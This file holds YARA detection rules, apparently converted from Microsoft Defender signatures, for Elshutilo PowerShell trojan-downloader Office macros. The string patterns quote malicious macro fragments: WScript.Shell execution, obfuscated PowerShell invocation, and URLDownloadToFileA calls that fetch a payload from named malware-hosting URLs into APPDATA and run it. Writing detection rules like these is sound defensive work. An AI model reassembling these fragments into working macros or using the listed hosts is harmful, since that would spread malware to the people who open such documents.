rule TrojanDownloader_PowerShell_Elshutilo_CS_2147749199_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:PowerShell/Elshutilo.CS!eml"
        threat_id = "2147749199"
        type = "TrojanDownloader"
        platform = "PowerShell: "
        family = "Elshutilo"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 52 65 70 6c 61 63 65 28 [0-11] 2c 20 22 [0-42] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = "Set er = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_3 = "er.Run" ascii //weight: 1
        $x_1_4 = {6c 69 6e 65 54 65 78 74 1e 00 3d 20 [0-15] 20 2b 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_PowerShell_Elshutilo_CM_2147749636_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:PowerShell/Elshutilo.CM!eml"
        threat_id = "2147749636"
        type = "TrojanDownloader"
        platform = "PowerShell: "
        family = "Elshutilo"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub Document_Open()" ascii //weight: 1
        $x_1_2 = "Set aw = CreateObject(\"Wscript.Shell\")" ascii //weight: 1
        $x_1_3 = {61 77 2e 52 75 6e 20 74 6f 74 61 6c ?? 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_4 = {74 6f 74 61 6c ?? 20 3d 20 74 6f 74 61 6c ?? 20 2b 20 22 5f 31 30 5f 22 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_5 = {74 6f 74 61 6c ?? 20 3d 20 74 6f 74 61 6c ?? 20 2b 20 [0-80] 73 20 2b 20 [0-80] 74 20 2b 20 [0-80] 61 20 2b 20 [0-80] 72 20 2b 20 [0-80] 74 20 2b 20 [0-80] 75 20 2b 20 [0-80] 70 20 2b 20 22 5f 22 20 2b 20 [0-80] 74 20 2b 20 [0-80] 61 20 2b 20 [0-80] 73 20 2b 20 [0-80] 6b 20 2b 20 22 27 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_PowerShell_Elshutilo_CZ_2147749890_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:PowerShell/Elshutilo.CZ!eml"
        threat_id = "2147749890"
        type = "TrojanDownloader"
        platform = "PowerShell: "
        family = "Elshutilo"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 52 65 70 6c 61 63 65 28 [0-11] 2c 20 22 [0-42] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = "Set enbmggr = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_3 = "enbmggr.Run" ascii //weight: 1
        $x_1_4 = {6c 69 6e 65 54 65 78 74 1e 00 3d 20 [0-15] 20 2b 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_PowerShell_Elshutilo_AJ_2147750786_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:PowerShell/Elshutilo.AJ!MTB"
        threat_id = "2147750786"
        type = "TrojanDownloader"
        platform = "PowerShell: "
        family = "Elshutilo"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Replace(f1, \"/\\\", \"2\"))" ascii //weight: 1
        $x_1_2 = "Replace(\"Pow#&*$%ell\", \"#&*$%\", \"ersh\"))" ascii //weight: 1
        $x_1_3 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 45 78 65 63 75 74 65 45 78 63 65 6c 34 4d 61 63 72 6f 20 28 [0-11] 20 2b 20 22 22 22 22 20 2b 20 ?? 20 2b 20 22 22 22 22 20 2b 20 22 2c 20 22 20 2b 20 22 22 22 22 20 2b 20 ?? 20 2b 20 22 22 22 22 20 2b 20 22 2c 20 22 22 22 22 2c 20 30 29 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_PowerShell_Elshutilo_PS_2147750787_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:PowerShell/Elshutilo.PS!MTB"
        threat_id = "2147750787"
        type = "TrojanDownloader"
        platform = "PowerShell: "
        family = "Elshutilo"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Dim si As STARTUPINFO" ascii //weight: 1
        $x_2_2 = "Ret3 = Environ$(\"APPDATA\") + \"\\pay1.ps1\"" ascii //weight: 2
        $x_2_3 = "Ret2 = URLDownloadToFileA(0, \"http://kredytinksao.pl/raw.txt\", Ret3, 0, 0)" ascii //weight: 2
        $x_2_4 = "Ret2 = URLDownloadToFileA(0, \"http://wpr.mko.waw.pl/uploads/scheduler.txt\", Ret3, 0, 0)" ascii //weight: 2
        $x_1_5 = "Ret7 = CreateFileA(Ret3, 1, 2, sa, 3, 0, 0)" ascii //weight: 1
        $x_1_6 = "Ret = CreateProcessA(vbNullString, Ret9, ByVal 0&, ByVal 0&, True, 32, ByVal 0&, vbNullString, si, pi)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 3 of ($x_1_*))) or
            ((3 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

